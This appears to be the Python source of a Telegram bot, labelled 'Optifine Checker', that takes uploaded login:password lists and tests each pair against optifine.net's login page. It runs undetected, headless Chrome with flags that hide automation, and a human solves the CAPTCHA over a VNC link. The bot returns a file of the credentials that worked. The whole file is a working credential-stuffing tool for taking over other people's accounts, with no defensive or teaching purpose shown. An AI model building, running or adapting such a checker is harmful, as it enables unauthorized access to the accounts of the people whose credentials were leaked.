import os
import sys
import logging
import asyncio
import aiofiles
import time
import subprocess
import json
from datetime import datetime

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА!")
    sys.exit(1)

ADMIN_IDS = [int(id.strip()) for id in os.environ.get('ADMIN_IDS', '').split(',') if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy()

bot_stats = {'total': 0, 'valid': 0, 'invalid': 0, 'start_time': datetime.now()}
active_sessions = {}
os.makedirs('/app/debug', exist_ok=True)

def get_railway_url():
    try:
        result = subprocess.run(['curl', '-s', 'http://metadata.railway.internal/'], 
                              capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            data = json.loads(result.stdout)
            hostname = data.get('hostname')
            if hostname:
                return f"https://{hostname}.railway.app"
    except:
        pass
    return "https://cs2-telegram-bot-production.up.railway.app"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    url = get_railway_url()
    await update.message.reply_text(
        f"👋 **Optifine Checker**\n\n"
        f"📱 **Доступ к браузеру:**\n"
        f"{url}/vnc.html\n\n"
        f"📥 Отправь .txt файл с аккаунтами\n"
        f"Формат: логин:пароль"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Нужен .txt файл")
        return
    
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_{update.effective_user.id}_{doc.file_name}"
    await file.download_to_drive(path)
    
    async with aiofiles.open(path, 'r', encoding='utf-8') as f:
        content = await f.read()
    
    accounts = []
    for line in content.strip().split('\n'):
        if ':' in line:
            l, p = line.split(':', 1)
            accounts.append((l.strip(), p.strip()))
    
    if not accounts:
        await update.message.reply_text("❌ Нет аккаунтов")
        return
    
    session_id = f"{update.effective_user.id}_{int(time.time())}"
    url = get_railway_url()
    
    keyboard = [[InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"done_{session_id}")]]
    
    await update.message.reply_text(
        f"📊 Аккаунтов: {len(accounts)}\n\n"
        f"1️⃣ Открой браузер:\n{url}/vnc.html\n"
        f"2️⃣ Нажми Connect\n"
        f"3️⃣ В Chrome нажми на галочку\n"
        f"4️⃣ Если просит снова - обнови страницу\n"
        f"5️⃣ После успеха нажми кнопку",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    active_sessions[session_id] = {
        'user_id': update.effective_user.id,
        'accounts': accounts,
        'file_path': path
    }

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith('done_'):
        session_id = query.data.replace('done_', '')
        
        if session_id not in active_sessions:
            await query.edit_message_text("❌ Сессия устарела")
            return
        
        session = active_sessions[session_id]
        await query.edit_message_text("🚀 Запускаю проверку...")
        
        try:
            # Запускаем Chrome
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--disable-gpu')
            options.add_argument('--headless=new')
            options.add_argument('--disable-blink-features=AutomationControlled')
            
            driver = uc.Chrome(options=options, version_main=145, headless=True)
            driver.get("https://optifine.net/login")
            time.sleep(3)
            
            results = {'valid': [], 'invalid': []}
            
            for login, password in session['accounts']:
                try:
                    # Ввод логина
                    email = driver.find_element(By.CSS_SELECTOR, "input[type='text'], input[type='email']")
                    email.clear()
                    email.send_keys(login)
                    time.sleep(1)
                    
                    # Ввод пароля
                    pwd = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                    pwd.clear()
                    pwd.send_keys(password)
                    time.sleep(1)
                    
                    # Нажатие кнопки
                    btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                    btn.click()
                    time.sleep(3)
                    
                    # Проверка
                    if 'downloads' in driver.current_url:
                        results['valid'].append({'login': login, 'password': password})
                        bot_stats['valid'] += 1
                    else:
                        results['invalid'].append(login)
                        bot_stats['invalid'] += 1
                    
                    bot_stats['total'] += 1
                    driver.get("https://optifine.net/login")
                    time.sleep(2)
                    
                except Exception as e:
                    logger.error(f"Ошибка при проверке {login}: {e}")
                    results['invalid'].append(login)
                    bot_stats['invalid'] += 1
            
            driver.quit()
            
            # Отправка результатов
            if results['valid']:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
                async with aiofiles.open(filename, 'w') as f:
                    for acc in results['valid']:
                        await f.write(f"{acc['login']}:{acc['password']}\n")
                with open(filename, 'rb') as f:
                    await query.message.reply_document(f, filename=filename)
                os.remove(filename)
            
            await query.message.reply_text(
                f"✅ Готово!\n"
                f"Всего: {len(session['accounts'])}\n"
                f"✅ Рабочих: {len(results['valid'])}"
            )
            
        except Exception as e:
            await query.message.reply_text(f"❌ Ошибка: {e}")
        
        if os.path.exists(session['file_path']):
            os.remove(session['file_path'])
        del active_sessions[session_id]

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН!")
    app.run_polling()

if __name__ == '__main__':
    main()